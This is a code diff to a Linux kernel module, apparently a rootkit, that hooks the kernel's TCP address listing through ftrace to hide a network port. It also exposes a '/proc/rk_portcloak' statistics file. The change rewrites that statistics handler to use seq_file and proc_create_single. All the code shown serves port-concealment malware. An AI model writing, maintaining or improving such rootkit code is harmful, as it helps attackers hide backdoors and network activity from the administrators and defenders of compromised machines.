@@ -86,20 +86,12 @@ static void remove_hook(void)
 	ftrace_set_filter_ip(&tcp_ops, tcp_show_addr, 1, 0);
 }
 
-static ssize_t stats_show(struct file *f, char __user *buf,
-			  size_t count, loff_t *pos)
+static int stats_show(struct seq_file *m, void *v)
 {
-	char tmp[64];
-	int len;
-
-	len = snprintf(tmp, sizeof(tmp), "port=%d\nhidden=%d\n",
-		       HIDDEN_PORT, atomic_read(&hide_count));
-	return simple_read_from_buffer(buf, count, pos, tmp, len);
+	seq_printf(m, "port=%d\nhidden=%d\n",
+		   HIDDEN_PORT, atomic_read(&hide_count));
+	return 0;
 }
-
-static const struct proc_ops port_ops = {
-	.proc_read = stats_show,
-};
 
 static int __init porthider_init(void)
 {
@@ -111,7 +103,7 @@ static int __init porthider_init(void)
 		return err;
 	}
 
-	proc_entry = proc_create("rk_portcloak", 0444, NULL, &port_ops);
+	proc_entry = proc_create_single("rk_portcloak", 0444, NULL, stats_show);
 	if (!proc_entry) {
 		remove_hook();
 		return -ENOMEM;
